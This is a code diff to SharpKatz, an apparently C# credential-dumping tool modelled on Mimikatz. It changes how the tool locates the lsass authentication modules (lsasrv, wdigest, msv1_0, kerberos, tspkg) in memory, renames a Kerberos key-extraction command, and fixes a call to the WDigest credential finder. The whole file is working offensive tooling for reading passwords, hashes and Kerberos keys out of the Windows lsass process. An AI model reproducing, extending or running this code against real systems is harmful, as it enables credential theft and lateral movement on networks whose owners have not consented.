@@ -1,10 +1,8 @@
-﻿using SharpKatz.Credential;
-using SharpKatz.Module;
+﻿using NDesk.Options;
+using SharpKatz.Credential;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Reflection;
-using NDesk.Options;
 
 namespace SharpKatz
 {
@@ -75,32 +73,34 @@ namespace SharpKatz
             Process plsass = Process.GetProcessesByName("lsass")[0];
 
             ProcessModuleCollection processModules = plsass.Modules;
+            int modulefound = 0;
 
-            for(int i = 0; i < processModules.Count; i++ )
+            for(int i = 0; i < processModules.Count && modulefound < 5; i++ )
             {
                 if (processModules[i].ModuleName.ToLower().Contains("lsasrv.dll"))
                 {
                     lsasrv = processModules[i].BaseAddress;
+                    modulefound++;
                 }
                 if (processModules[i].ModuleName.ToLower().Contains("wdigest.dll"))
                 {
                     wdigest = processModules[i].BaseAddress;
+                    modulefound++;
                 }
                 if (processModules[i].ModuleName.ToLower().Contains("msv1_0.dll"))
                 {
                     lsassmsv1 = processModules[i].BaseAddress;
+                    modulefound++;
                 }
                 if (processModules[i].ModuleName.ToLower().Contains("kerberos.dll"))
                 {
                     kerberos = processModules[i].BaseAddress;
+                    modulefound++;
                 }
                 if (processModules[i].ModuleName.ToLower().Contains("tspkg.dll"))
                 {
                     tspkg = processModules[i].BaseAddress;
-                }
-                if (processModules[i].ModuleName.ToLower().Contains("livessp.dll"))
-                {
-                    lsasslive = processModules[i].BaseAddress;
+                    modulefound++;
                 }
 
             }
@@ -130,13 +130,13 @@ namespace SharpKatz
                     foreach (byte[] p in klogonlist)
                         Module.Kerberos.GetCredentials(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
 
-                if (command.Equals("ekey"))
+                if (command.Equals("ekeys"))
                     foreach (byte[] p in klogonlist)
                         Module.Kerberos.GetKerberosKeys(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
             }
 
             if (command.Equals("logonpasswords") || command.Equals("wdigest"))
-                WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+                Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
 
             Utility.PrintLogonList(logonlist);
 
